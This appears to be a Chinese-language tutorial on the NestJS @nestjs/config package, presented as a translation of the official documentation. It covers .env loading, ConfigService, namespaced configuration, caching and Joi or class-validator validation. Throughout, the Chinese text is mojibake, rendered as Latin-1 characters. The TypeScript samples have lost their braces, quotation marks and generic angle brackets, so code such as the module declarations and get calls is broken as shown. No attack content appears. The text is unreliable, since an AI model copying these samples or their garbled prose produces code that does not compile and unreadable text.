è½½åˆ°procress.envä¸­ï¼Œå°±éœ€è¦ä½¿ç”¨dotenvè¿™ä¸ªåŒ…äº†ï¼Œä½†æ˜¯Nestæä¾›äº†ä¸€ä¸ªé…ç½®ç¯å¢ƒå˜é‡çš„è½¯ä»¶åŒ… - @nestjs/configï¼Œå…¶å†…éƒ¨ä¾èµ–äº†dotenvã€‚ å®‰è£…@nestjs/config// npm$ npm i --save @nestjs/config// yarn$ yarn add @nestjs/config ç®€å•ä½¿ç”¨å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥å¯¼å…¥ConfigModuleã€‚é€šå¸¸ï¼Œæˆ‘ä»¬å°†å…¶å¯¼å…¥æ ¹ç›®å½•AppModuleå¹¶ä½¿ç”¨. forRoot()é™æ€æ–¹æ³•æ§åˆ¶å…¶è¡Œä¸ºã€‚åœ¨æ­¤æ­¥éª¤ä¸­ï¼Œå°†è§£æå¹¶ç”Ÿæˆç¯å¢ƒå˜é‡é”®å€¼å¯¹ã€‚ç¨åï¼Œæˆ‘ä»¬å°†åœ¨å…¶ä»–åŠŸèƒ½æ¨¡å—ä¸­çœ‹åˆ°ä¸€äº›ç”¨äºè®¿é—®çš„ConfigServiceç±»çš„é€‰é¡¹ConfigModuleã€‚ import Module from @nestjs/common;import ConfigModule from @nestjs/config;@Module( imports: [ConfigModule.forRoot()],)export class AppModule ä¸Šé¢çš„ä»£ç å°†ä».envé»˜è®¤ä½ç½®ï¼ˆé¡¹ç›®æ ¹ç›®å½•ï¼‰åŠ è½½å¹¶è§£ææ–‡ä»¶ï¼Œå°†æ–‡ä»¶ä¸­çš„é”®å€¼å¯¹.envä¸åˆ†é…ç»™å…¶çš„ç¯å¢ƒå˜é‡åˆå¹¶process.envï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ç§æœ‰ç»“æ„ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡è®¿é—®è¯¥ç§æœ‰ç»“æ„ConfigServiceã€‚è¯¥forRoot()æ–¹æ³•æ³¨å†Œäº†ConfigServiceæä¾›ç¨‹åºï¼Œè¯¥æä¾›ç¨‹åºæä¾›äº†get()ä¸€ç§è¯»å–è¿™äº›å·²è§£æåˆå¹¶çš„é…ç½®å˜é‡çš„æ–¹æ³•ã€‚ç”±äº@nestjs/configä¾èµ–äºdotenvï¼Œå› æ­¤å®ƒä½¿ç”¨è¯¥ç¨‹åºåŒ…çš„è§„åˆ™æ¥è§£å†³ç¯å¢ƒå˜é‡åç§°ä¸­çš„å†²çªã€‚å½“å¯†é’¥åœ¨è¿è¡Œæ—¶ç¯å¢ƒä¸­ä½œä¸ºç¯å¢ƒå˜é‡ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡OS shellå¯¼å‡ºä¹‹ç±»export DATABASE_USERtestï¼‰å’Œåœ¨.envæ–‡ä»¶ä¸­åŒæ—¶å­˜åœ¨æ—¶ï¼Œè¿è¡Œæ—¶ç¯å¢ƒå˜é‡ä¼˜å…ˆã€‚ ç¤ºä¾‹.envæ–‡ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼š DATABASE_USER=testDATABASE_PASSWORD=test è‡ªå®šä¹‰ENVæ–‡ä»¶è·¯å¾„é»˜è®¤æƒ…å†µä¸‹ï¼Œç¨‹åºä¼šåœ¨åº”ç”¨ç¨‹åºçš„æ ¹ç›®å½•ä¸­æŸ¥æ‰¾.envæ–‡ä»¶ã€‚è¦ä¸º.envæ–‡ä»¶æŒ‡å®šå…¶ä»–è·¯å¾„ï¼Œè¯·è®¾ç½®forRoot()çš„å¯é€‰å±æ€§envFilePathï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š ConfigModule.forRoot( envFilePath: .development.env,); æ‚¨è¿˜å¯ä»¥ä¸º.envæ–‡ä»¶æŒ‡å®šå¤šä¸ªè·¯å¾„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š ConfigModule.forRoot( envFilePath: [.env.development.local, .env.development],); å¦‚æœåœ¨å¤šä¸ªæ–‡ä»¶ä¸­æ‰¾åˆ°ä¸€ä¸ªå˜é‡ï¼Œåˆ™ç¬¬ä¸€ä¸ªä¼˜å…ˆã€‚ åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¾€å¾€æœ‰å¤šä¸ªé…ç½®æ–‡ä»¶ï¼Œæ¯”å¦‚å¼€å‘ç¯å¢ƒä½¿ç”¨.development.envé…ç½®æ–‡ä»¶ï¼Œæµ‹è¯•ç¯å¢ƒä½¿ç”¨.test.envé…ç½®æ–‡ä»¶ï¼Œç”Ÿäº§ç¯å¢ƒä½¿ç”¨.production.envé…ç½®æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ä¸åŒçš„å¯åŠ¨å‘½ä»¤ï¼Œå¯ç”¨ä¸åŒçš„é…ç½®æ–‡ä»¶ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š // package.json ... scripts: start: cross-env NODE_ENV=development nest start, start:dev: cross-env NODE_ENV=development nest start --watch, start:prod: cross-env NODE_ENV=production node dist/main, test: cross-env NODE_ENV=test jest, , ... å®‰è£…cross-envï¼Œä½¿ç”¨å®ƒè·¨å¹³å°çš„è®¾ç½®ç¯å¢ƒå˜é‡ ConfigModule.forRoot( envFilePath: `$process.env.NODE_ENV || development.env`,); ä½¿ç”¨å…¨å±€moduleå¦‚æœè¦ConfigModuleåœ¨å…¶ä»–æ¨¡å—ä¸­ä½¿ç”¨ï¼Œåˆ™éœ€è¦å°†å…¶å¯¼å…¥ï¼ˆè¿™æ˜¯æ‰€æœ‰Nestæ¨¡å—çš„æ ‡å‡†é…ç½®ï¼‰ã€‚æˆ–è€…ï¼Œé€šè¿‡å°†optionså¯¹è±¡çš„isGlobalå±æ€§è®¾ç½®ä¸ºtrueï¼Œå°†å…¶å£°æ˜ä¸ºå…¨å±€æ¨¡å—ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€æ—¦ConfigModuleè¢«åŠ è½½åˆ°æ ¹æ¨¡å—ä¸­ï¼Œå°±ä¸éœ€è¦åœ¨å…¶ä»–æ¨¡å—ä¸­å¯¼å…¥ConfigModuleäº† ConfigModule.forRoot( isGlobal: true,); è‡ªå®šä¹‰é…ç½®æ–‡ä»¶å¯¹äºæ›´å¤æ‚çš„é¡¹ç›®ï¼Œå¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰é…ç½®æ–‡ä»¶è¿”å›åµŒå¥—çš„é…ç½®å¯¹è±¡ã€‚è¿™å…è®¸æ‚¨æŒ‰åŠŸèƒ½å¯¹ç›¸å…³é…ç½®è®¾ç½®è¿›è¡Œåˆ†ç»„ï¼ˆä¾‹å¦‚ï¼Œä¸æ•°æ®åº“ç›¸å…³çš„è®¾ç½®ï¼‰ï¼Œå¹¶å°†ç›¸å…³è®¾ç½®å­˜å‚¨åœ¨å•ä¸ªæ–‡ä»¶ä¸­ï¼Œä»¥å¸®åŠ©ç‹¬ç«‹ç®¡ç†å®ƒä»¬ã€‚ è‡ªå®šä¹‰é…ç½®æ–‡ä»¶å¯¼å‡ºä¸€ä¸ªå·¥å‚å‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›ä¸€ä¸ªé…ç½®å¯¹è±¡ã€‚é…ç½®å¯¹è±¡å¯ä»¥æ˜¯ä»»ä½•ä»»æ„åµŒå¥—çš„æ™®é€šJavaScriptå¯¹è±¡ã€‚process.envå¯¹è±¡å°†åŒ…å«å®Œå…¨è§£æçš„ç¯å¢ƒå˜é‡key-valueå¯¹ï¼ˆå¦‚ä¸Šæ‰€è¿°ï¼Œ.envæ–‡ä»¶å’Œå¤–éƒ¨å®šä¹‰çš„å˜é‡è¢«è§£æå’Œåˆå¹¶ï¼‰ã€‚ç”±äºä½ æ§åˆ¶äº†è¿”å›çš„é…ç½®å¯¹è±¡ï¼Œä½ å¯ä»¥æ·»åŠ ä»»ä½•æ‰€éœ€çš„é€»è¾‘æ¥å°†å€¼æŠ•å°„åˆ°ä¸€ä¸ªé€‚å½“çš„ç±»å‹ï¼Œè®¾ç½®é»˜è®¤å€¼ç­‰ã€‚ä¾‹å¦‚ export default () = ( port: parseInt(process.env.PORT, 10) || 3000, database: host: process.env.DATABASE_HOST, port: parseInt(process.env.DATABASE_PORT, 10) || 5432 ); å°†å…¶ä¼ ç»™ConfigModule.forRoot()çš„loadå±æ€§ï¼Œæ¥åŠ è½½è¿™ä¸ªè‡ªå®šä¹‰é…ç½®ï¼š import configuration from ./config/configuration;@Module( imports: [ ConfigModule.forRoot( load: [configuration], ), ],)export class AppModule loadå±æ€§æ˜¯ä¸ªæ•°ç»„ï¼Œå…è®¸åŠ è½½å¤šä¸ªè‡ªå®šä¹‰é…ç½®æ–‡ä»¶ é€šè¿‡è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç®¡ç†è‡ªå®šä¹‰æ–‡ä»¶ï¼Œå¦‚YAMLæ–‡ä»¶ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨YAMLæ ¼å¼çš„é…ç½®çš„ä¾‹å­ã€‚ http: host: localhost port: 8080db: postgres: url: localhost port: 5432 database: yaml-db sqlite: database: sqlite.db ä¸ºäº†è¯»å–å’Œè§£æYAMLæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨js-yamlåŒ…ã€‚ $ npm i js-yaml$ npm i -D @types/js-yaml å®‰è£…è½¯ä»¶åŒ…åï¼Œæˆ‘ä»¬å°†ä½¿ç”¨yaml#loadå‡½æ•°æ¥åŠ è½½åˆšåˆšåœ¨ä¸Šé¢åˆ›å»ºçš„YAMLæ–‡ä»¶ã€‚ import readFileSync from fs;import * as yaml from js-yaml;import join from path;const YAML_CONFIG_FILENAME = config.yml;export default () = return yaml.load( fs.readFileSync(join(__dirname, YAML_CONFIG_FILENAME), utf8), );; ä½¿ç”¨ConfigServiceè¦ä»ConfigServiceä¸­è®¿é—®é…ç½®å€¼ï¼Œæˆ‘ä»¬é¦–å…ˆå¾—æ³¨å…¥ConfigServiceï¼Œå’Œä½¿ç”¨å…¶ä»–providerä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶åŠ å…¥@Moduleçš„importså±æ€§ä¸­ï¼ˆå¦‚æœå°†ConfigModuleé…ç½®æˆå…¨å±€moduleï¼Œåˆ™å¯ä»¥å¿½ç•¥è¿™ä¸€æ­¥ï¼‰ @Module( imports: [ConfigModule], // ...) ç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„æ„é€ å‡½æ•°æ³¨å…¥: // import ConfigService from @nestjs/config;constructor(private configService: ConfigService) è·å– // get an environment variableconst dbUser = this.configService.getstring(DATABASE_USER);// get a custom configuration valueconst dbHost = this.configService.getstring(database.host); å¦‚ä¸Šæ‰€ç¤ºï¼Œä½¿ç”¨configService.get()æ–¹æ³•é€šè¿‡ä¼ é€’å˜é‡åæ¥è·å–ä¸€ä¸ªç®€å•çš„ç¯å¢ƒå˜é‡ã€‚ä½ å¯ä»¥é€šè¿‡ä¼ é€’ç±»å‹æ¥åšTypeScriptç±»å‹æç¤ºï¼Œå¦‚ä¸Šæ‰€ç¤º(ä¾‹å¦‚ï¼Œgetstring(â€¦))ã€‚get()æ–¹æ³•ä¹Ÿå¯ä»¥éå†ä¸€ä¸ªåµŒå¥—çš„è‡ªå®šä¹‰é…ç½®å¯¹è±¡ï¼ˆé€šè¿‡è‡ªå®šä¹‰é…ç½®æ–‡ä»¶åˆ›å»ºï¼‰ï¼Œå¦‚ä¸Šé¢ç¬¬äºŒä¸ªä¾‹å­æ‰€ç¤ºã€‚ ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ¥å£ä½œä¸ºç±»å‹æç¤ºæ¥è·å¾—æ•´ä¸ªåµŒå¥—çš„è‡ªå®šä¹‰é…ç½®å¯¹è±¡ã€‚ interface DatabaseConfig host: string; port: number;const dbConfig = this.configService.getDatabaseConfig(database);// you can now use `dbConfig.port` and `dbConfig.host`const port = dbConfig.port; get()æ–¹æ³•è¿˜éœ€è¦ä¸€ä¸ªå¯é€‰çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå®šä¹‰ä¸€ä¸ªé»˜è®¤å€¼ï¼Œå½“é”®ä¸å­˜åœ¨æ—¶ï¼Œå°†è¿”å›é»˜è®¤å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤º: // use localhost when database.host is not definedconst dbHost = this.configService.getstring(database.host, localhost); ConfigServiceæœ‰ä¸€ä¸ªå¯é€‰çš„æ³›å‹(ç±»å‹å‚æ•°)æ¥å¸®åŠ©é˜²æ­¢è®¿é—®ä¸å­˜åœ¨çš„é…ç½®å±æ€§ã€‚ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹: interface EnvironmentVariables PORT: number; TIMEOUT: string;// somewhere in the codeconstructor(private configService: ConfigServiceEnvironmentVariables) // this is valid const port = this.configService.getnumber(PORT); // this is invalid as URL is not a property on the EnvironmentVariables interface const url = this.configService.getstring(URL); é…ç½®å‘½åç©ºé—´ConfigModuleå…è®¸æ‚¨å®šä¹‰å’ŒåŠ è½½å¤šä¸ªè‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œå¦‚ä¸Šé¢çš„è‡ªå®šä¹‰é…ç½®æ–‡ä»¶æ‰€ç¤ºã€‚æ‚¨å¯ä»¥ä½¿ç”¨åµŒå¥—çš„é…ç½®å¯¹è±¡ç®¡ç†å¤æ‚çš„é…ç½®å¯¹è±¡å±‚æ¬¡ï¼Œå¦‚è¯¥èŠ‚æ‰€ç¤ºã€‚å¦å¤–ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ registerAs()å‡½æ•°è¿”å›ä¸€ä¸ª â€œnamespaced â€œçš„é…ç½®å¯¹è±¡ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ import registerAs from @nestjs/config; export default registerAs(database, () = ( host: process.env.DATABASE_HOST, port: process.env.DATABASE_PORT || 5432)); ç”¨forRoot()æ–¹æ³•çš„å‚æ•°å¯¹è±¡çš„loadå±æ€§åŠ è½½ä¸€ä¸ªå‘½åç©ºé—´çš„é…ç½®ï¼Œä¸åŠ è½½è‡ªå®šä¹‰é…ç½®æ–‡ä»¶çš„æ–¹å¼ç›¸åŒã€‚ import databaseConfig from ./config/database.config;@Module( imports: [ ConfigModule.forRoot( load: [databaseConfig], ), ],)export class AppModule ç°åœ¨ï¼Œè¦ä»databaseå‘½åç©ºé—´ä¸­è·å–hostï¼Œä½¿ç”¨ç‚¹æ“ä½œç¬¦ã€‚ä½¿ç”¨databaseä½œä¸ºå±æ€§åçš„å‰ç¼€ï¼Œå¯¹åº”äºå‘½åç©ºé—´çš„åç§°ï¼ˆä½œä¸º registerAs() å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ï¼‰ã€‚ const dbHost = this.configService.getstring(database.host); ä¸€ä¸ªåˆç†çš„é€‰æ‹©æ˜¯ç›´æ¥æ³¨å…¥databaseå‘½åç©ºé—´ã€‚è¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿä»å¼ºç±»å‹åŒ–ä¸­è·ç›Šã€‚ // import ConfigType from @nestjs/config;constructor( @Inject(databaseConfig.KEY) private dbConfig: ConfigTypetypeof databaseConfig,) ç¼“å­˜ç¯å¢ƒå˜é‡ç”±äºè®¿é—®process.envä¼šå¾ˆæ…¢ï¼Œä½ å¯ä»¥è®¾ç½®ä¼ é€’ç»™ConfigModule.forRoot()çš„optionså¯¹è±¡çš„cacheå±æ€§ï¼Œä»¥æé«˜ConfigServiceçš„æ€§èƒ½ã€‚ ConfigModule.forRoot( cache: true,); éƒ¨åˆ†æ³¨å†Œåˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»ç”¨forRoot()æ–¹æ³•å¤„ç†äº†æ ¹æ¨¡å—(å¦‚AppModule)ä¸­çš„é…ç½®æ–‡ä»¶ã€‚ä¹Ÿè®¸ä½ æœ‰ä¸€ä¸ªæ›´å¤æ‚çš„é¡¹ç›®ç»“æ„ï¼Œç‰¹å®šåŠŸèƒ½çš„é…ç½®æ–‡ä»¶ä½äºå¤šä¸ªä¸åŒçš„ç›®å½•ä¸­ã€‚@nestjs/configåŒ…æä¾›äº†ä¸€ä¸ªå«åšéƒ¨åˆ†æ³¨å†Œçš„åŠŸèƒ½ï¼Œå®ƒåªå¼•ç”¨ä¸æ¯ä¸ªåŠŸèƒ½æ¨¡å—ç›¸å…³è”çš„é…ç½®æ–‡ä»¶ï¼Œè€Œä¸æ˜¯åœ¨æ ¹æ¨¡å—ä¸­åŠ è½½æ‰€æœ‰è¿™äº›æ–‡ä»¶ã€‚åœ¨ç‰¹æ€§æ¨¡å—ä¸­ä½¿ç”¨forFeature()é™æ€æ–¹æ³•æ¥æ‰§è¡Œè¿™ä¸ªéƒ¨åˆ†æ³¨å†Œï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ import databaseConfig from ./config/database.config;@Module( imports: [ConfigModule.forFeature(databaseConfig)],)export class DatabaseModule æ ¡éªŒç¯å¢ƒå˜é‡å¦‚æœæ‰€éœ€çš„ç¯å¢ƒå˜é‡æ²¡æœ‰è¢«æä¾›æˆ–ä¸ç¬¦åˆæŸäº›éªŒè¯è§„åˆ™ï¼Œåœ¨åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶æŠ›å‡ºå¼‚å¸¸æ˜¯æ ‡å‡†åšæ³•ã€‚@nestjsconfigåŒ…æœ‰ä¸¤ç§ä¸åŒçš„æ–¹å¼æ¥å®ç°è¿™ä¸€ç‚¹ã€‚ Joiå†…ç½®éªŒè¯å™¨ã€‚ä½¿ç”¨Joiï¼Œä½ å¯ä»¥å®šä¹‰ä¸€ä¸ªå¯¹è±¡æ¨¡å¼ï¼Œå¹¶å¯¹å…¶è¿›è¡ŒJavaScriptå¯¹è±¡éªŒè¯ã€‚ ä¸€ä¸ªè‡ªå®šä¹‰çš„validate()å‡½æ•°ï¼Œå®ƒæ¥å—ç¯å¢ƒå˜é‡ä½œä¸ºè¾“å…¥ã€‚ è¦ä½¿ç”¨Joiï¼Œæˆ‘ä»¬å¿…é¡»å®‰è£…JoiåŒ…: $ yarn add joi æœ€æ–°ç‰ˆæœ¬çš„joiéœ€è¦ä½ è¿è¡ŒNode v12æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚æ—§ç‰ˆæœ¬çš„nodeè¯·å®‰è£…v16.1.8ã€‚è¿™ä¸»è¦æ˜¯åœ¨v17.0.2å‘å¸ƒåï¼Œåœ¨æ„å»ºçš„æ—¶å€™ä¼šå‡ºç°é”™è¯¯ã€‚æ›´å¤šä¿¡æ¯è¯·å‚è€ƒå…¶17.0.0å‘å¸ƒè¯´æ˜(https://github.com/sideway/joi/issues/2262)ã€‚ ç°åœ¨æˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªJoiéªŒè¯æ¨¡å¼ï¼Œå¹¶é€šè¿‡forRoot()æ–¹æ³•çš„é€‰é¡¹å¯¹è±¡çš„validationSchemaå±æ€§ä¼ é€’ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ import * as Joi from joi;@Module( imports: [ ConfigModule.forRoot( validationSchema: Joi.object( NODE_ENV: Joi.string() .valid(development, production, test, provision) .default(development), PORT: Joi.number().default(3000), ), ), ],)export class AppModule é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„ schema keys éƒ½è¢«è®¤ä¸ºæ˜¯å¯é€‰çš„ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬ä¸º NODE_ENVå’ŒPORTè®¾ç½®äº†é»˜è®¤å€¼ï¼Œå¦‚æœæˆ‘ä»¬ä¸åœ¨ç¯å¢ƒ(.envæ–‡ä»¶æˆ–è¿›ç¨‹ç¯å¢ƒ)ä¸­æä¾›è¿™äº›å˜é‡ï¼Œå°±ä¼šä½¿ç”¨è¿™äº›å˜é‡ã€‚å¦å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ required() éªŒè¯æ–¹æ³•æ¥è¦æ±‚å¿…é¡»åœ¨ç¯å¢ƒ (.env æ–‡ä»¶æˆ–è¿›ç¨‹ç¯å¢ƒ) ä¸­å®šä¹‰ä¸€ä¸ªå€¼ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æ²¡æœ‰åœ¨ç¯å¢ƒä¸­æä¾›å˜é‡ï¼ŒéªŒè¯æ­¥éª¤å°†æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚å…³äºå¦‚ä½•æ„é€ éªŒè¯æ¨¡å¼ï¼Œè¯·å‚è§JoiéªŒè¯æ–¹æ³•ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå…è®¸æœªçŸ¥çš„ç¯å¢ƒå˜é‡ï¼ˆæ¨¡å¼ä¸­é”®ä¸å­˜åœ¨çš„ç¯å¢ƒå˜é‡ï¼‰ï¼Œå¹¶ä¸”ä¸ä¼šè§¦å‘éªŒè¯å¼‚å¸¸ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„éªŒè¯é”™è¯¯éƒ½ä¼šè¢«æŠ¥å‘Šã€‚ä½ å¯ä»¥é€šè¿‡forRoot()é€‰é¡¹å¯¹è±¡çš„validationOptionsé”®ä¼ é€’ä¸€ä¸ªé€‰é¡¹å¯¹è±¡æ¥æ”¹å˜è¿™äº›è¡Œä¸ºã€‚è¿™ä¸ªé€‰é¡¹å¯¹è±¡å¯ä»¥åŒ…å«JoiéªŒè¯é€‰é¡¹æä¾›çš„ä»»ä½•æ ‡å‡†éªŒè¯é€‰é¡¹å±æ€§ã€‚ä¾‹å¦‚ï¼Œè¦åè½¬ä¸Šé¢çš„ä¸¤ä¸ªè®¾ç½®ï¼Œå¯ä»¥ä¼ é€’è¿™æ ·çš„é€‰é¡¹ã€‚ import * as Joi from joi;@Module( imports: [ ConfigModule.forRoot( validationSchema: Joi.object( NODE_ENV: Joi.string() .valid(development, production, test, provision) .default(development), PORT: Joi.number().default(3000), ), validationOptions: allowUnknown: false, abortEarly: true, , ), ],)export class AppModule @nestjsconfigåŒ…ä½¿ç”¨çš„é»˜è®¤è®¾ç½®æ˜¯: allowUnknownï¼šæ§åˆ¶æ˜¯å¦å…è®¸åœ¨ç¯å¢ƒå˜é‡ä¸­ä½¿ç”¨æœªçŸ¥é”®ã€‚é»˜è®¤ä¸ºtrueã€‚ abortEarlyï¼š å¦‚æœä¸ºtrueï¼Œåˆ™åœ¨ç¬¬ä¸€ä¸ªé”™è¯¯æ—¶åœæ­¢éªŒè¯ï¼›å¦‚æœä¸ºfalseï¼Œåˆ™è¿”å›æ‰€æœ‰é”™è¯¯ã€‚é»˜è®¤å€¼ä¸ºfalseã€‚ è¯·æ³¨æ„ï¼Œä¸€æ—¦ä½ å†³å®šä¼ é€’ä¸€ä¸ªvalidationOptionså¯¹è±¡ï¼Œä½ æ²¡æœ‰æ˜ç¡®ä¼ é€’çš„ä»»ä½•è®¾ç½®éƒ½å°†é»˜è®¤ä¸ºJoiæ ‡å‡†é»˜è®¤å€¼ï¼ˆè€Œä¸æ˜¯@nestjsconfigé»˜è®¤å€¼ï¼‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ åœ¨ä½ çš„è‡ªå®šä¹‰validationOptionså¯¹è±¡ä¸­æ²¡æœ‰æŒ‡å®šallowUnknownsï¼Œå®ƒå°†æœ‰Joié»˜è®¤å€¼falseã€‚å› æ­¤ï¼Œåœ¨æ‚¨çš„è‡ªå®šä¹‰å¯¹è±¡ä¸­æŒ‡å®šè¿™ä¸¤ä¸ªè®¾ç½®å¯èƒ½æ˜¯æœ€å®‰å…¨çš„ã€‚ è‡ªå®šä¹‰æ ¡éªŒå‡½æ•°å¦å¤–ï¼Œä½ ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªåŒæ­¥çš„validateå‡½æ•°ï¼Œè¯¥å‡½æ•°æ¥æ”¶ä¸€ä¸ªåŒ…å«ç¯å¢ƒå˜é‡çš„å¯¹è±¡ï¼ˆæ¥è‡ªenvæ–‡ä»¶å’Œè¿›ç¨‹ï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«éªŒè¯è¿‡çš„ç¯å¢ƒå˜é‡çš„å¯¹è±¡ï¼Œè¿™æ ·ä½ å°±å¯ä»¥åœ¨éœ€è¦çš„æ—¶å€™è½¬æ¢å®ƒä»¬ã€‚å¦‚æœå‡½æ•°æŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œå®ƒå°†é˜»æ­¢åº”ç”¨ç¨‹åºçš„å¼•å¯¼ã€‚ åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†ç»§ç»­ä½¿ç”¨class-transformerå’Œclass-validatoråŒ…ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å¿…é¡»å®šä¹‰ã€‚ ä¸€ä¸ªå…·æœ‰éªŒè¯çº¦æŸçš„ç±»ï¼Œ ä¸€ä¸ªä½¿ç”¨ plainToClass å’Œ validateSync å‡½æ•°çš„éªŒè¯å‡½æ•°ã€‚ import plainToClass from class-transformer;import IsEnum, IsNumber, validateSync from class-validator;enum Environment Development = development, Production = production, Test = test, Provision = provision,class EnvironmentVariables @IsEnum(Environment) NODE_ENV: Environment; @IsNumber() PORT: number;export function validate(config: Recordstring, unknown) const validatedConfig = plainToClass( EnvironmentVariables, config, enableImplicitConversion: true , ); const errors = validateSync(validatedConfig, skipMissingProperties: false ); if (errors.length 0) throw new Error(errors.toString()); return validatedConfig; å®Œæˆè¿™äº›ä¹‹åï¼Œä½¿ç”¨validateå‡½æ•°ä½œä¸ºConfigModuleçš„é…ç½®é€‰é¡¹ï¼Œå¦‚ä¸‹æ‰€ç¤º: import validate from ./env.validation;@Module( imports: [ ConfigModule.forRoot( validate, ), ],)export class AppModule è‡ªå®šä¹‰getterå‡½æ•°ConfigServiceå®šä¹‰äº†ä¸€ä¸ªé€šç”¨çš„get()æ–¹æ³•ï¼Œé€šè¿‡é”®æ¥æ£€ç´¢é…ç½®å€¼ã€‚æˆ‘ä»¬è¿˜å¯ä»¥æ·»åŠ getterå‡½æ•°ï¼Œä»¥å®ç°æ›´è‡ªç„¶çš„ç¼–ç é£æ ¼ã€‚ @Injectable()export class ApiConfigService constructor(private configService: ConfigService) get isAuthEnabled(): boolean return this.configService.get(AUTH_ENABLED) === true; ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨getterå‡½æ•°å¦‚ä¸‹: @Injectable()export class AppService constructor(apiConfigService: ApiConfigService) if (apiConfigService.isAuthEnabled) // Authentication is enabled å¯æ‰©å±•å˜é‡@nestjsconfigæ”¯æŒç¯å¢ƒå˜é‡æ‰©å±•ã€‚é€šè¿‡è¿™ç§æŠ€æœ¯ï¼Œä½ å¯ä»¥åˆ›å»ºåµŒå¥—çš„ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­ä¸€ä¸ªå˜é‡è¢«å¼•ç”¨åˆ°å¦ä¸€ä¸ªå˜é‡çš„å®šä¹‰ä¸­ã€‚æ¯”å¦‚è¯´ APP_URL=mywebsite.comSUPPORT_EMAIL=support@$APP_URL é€šè¿‡è¿™ç§ç»“æ„ï¼Œå˜é‡SUPPORT_EMAILè§£æä¸ºsupport@mywebsite.comã€‚è¯·æ³¨æ„ä½¿ç”¨ $... è¯­æ³•æ¥è§¦å‘è§£æ SUPPORT_EMAIL å®šä¹‰ä¸­çš„å˜é‡ APP_URL çš„å€¼ã€‚ å¯¹äºè¿™ä¸ªåŠŸèƒ½ï¼Œ@nestjsconfigåŒ…å†…éƒ¨ä½¿ç”¨dotenv-expandã€‚ ä½¿ç”¨ä¼ é€’ç»™ConfigModuleçš„forRoot()æ–¹æ³•çš„é€‰é¡¹å¯¹è±¡ä¸­çš„expandVariableså±æ€§å¯ç”¨ç¯å¢ƒå˜é‡æ‰©å±•ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ @Module( imports: [ ConfigModule.forRoot( // ... expandVariables: true, ), ],)export class AppModule åœ¨ main.ts ä¸­ä½¿ç”¨è™½ç„¶æˆ‘ä»¬çš„é…ç½®æ˜¯å­˜å‚¨åœ¨serviceä¸­çš„ï¼Œä½†å®ƒä»ç„¶å¯ä»¥åœ¨main.tsæ–‡ä»¶ä¸­ä½¿ç”¨ã€‚è¿™æ ·ï¼Œä½ å°±å¯ä»¥ç”¨å®ƒæ¥å­˜å‚¨å˜é‡ï¼Œå¦‚åº”ç”¨ç¨‹åºç«¯å£æˆ–CORS hostã€‚ è¦è®¿é—®å®ƒï¼Œä½ å¿…é¡»ä½¿ç”¨app.get()æ–¹æ³•ï¼Œç„¶åæ˜¯æœåŠ¡å¼•ç”¨ã€‚ const configService = app.get(ConfigService); ç„¶åï¼Œä½ å¯ä»¥åƒå¾€å¸¸ä¸€æ ·ï¼Œé€šè¿‡è°ƒç”¨é…ç½®é”®çš„getæ–¹æ³•æ¥ä½¿ç”¨å®ƒã€‚ const port = configService.get(PORT); æœ¬æ–‡åŸºæœ¬ä¸Šæ˜¯å®˜æ–‡æ–‡æ¡£ä¸­æœ‰å…³é…ç½®éƒ¨åˆ†çš„ä¸­æ–‡ç¿»è¯‘ï¼ˆhttps://docs.nestjs.com/techniques/configurationï¼‰ï¼Œæœ‰æ—¶é—´å†å†™ä¸ªå®æˆ˜æ–‡ç« 